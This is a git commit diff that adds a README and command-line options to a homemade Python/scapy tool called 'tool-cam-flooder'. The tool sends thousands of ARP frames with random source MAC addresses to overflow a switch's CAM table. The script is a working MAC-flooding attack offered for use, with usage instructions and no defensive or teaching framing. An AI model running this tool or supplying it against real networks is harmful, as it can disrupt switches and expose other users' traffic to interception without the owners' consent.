e84f4f5458f447a5d3d40d80883d59f35cb6ba35
TristanPinaudeau <tristan@flexfactory.fr>
2019-03-20 21:28:59 +0100

    Add Readme and improve uo

---
+++ README.md
@@ -0,0 +1,17 @@
+# tool-cam-flooder
+
+This is an homemade python tool using scapy.
+
+You should use it in a python virtual environnement.
+
+Usage :
+```
+$ pip install -r requirements
+$ python main.py --help
+Usage: main.py [OPTIONS]
+
+Options:
+  --nb-packets INTEGER  Number of packet to send to this CAM.
+  --verbose TEXT        Should the verbosity be activated ?
+  --help                Show this message and exit.
+```
--- main.py
+++ main.py
@@ -1,6 +1,16 @@
 from scapy.all import *
-import time
-import os
+import click
+
+@click.command()
+@click.option('--nb-packets', default=16000, help="Number of packet to send to this CAM.")
+@click.option('--verbose', default=True, help="Should the verbosity be activated ?")
+def main(nb_packets, verbose):
+    cpt = 0
+    while cpt <= nb_packets:
+        packet = Ether(src=rand_mac())/ARP()
+        sendp(packet, verbose=0)
+        if verbose: print(cpt)
+        cpt += 1
 
 def rand_mac():
     return "%02x:%02x:%02x:%02x:%02x:%02x" % (
@@ -12,10 +22,5 @@ def rand_mac():
         random.randint(0, 255)
     )
 
-cpt = 0
-
-while True:
-    packet = Ether(src=rand_mac())/ARP()
-    sendp(packet, verbose=0)
-    print(cpt)
-    cpt += 1
+if __name__ == '__main__':
+    main()
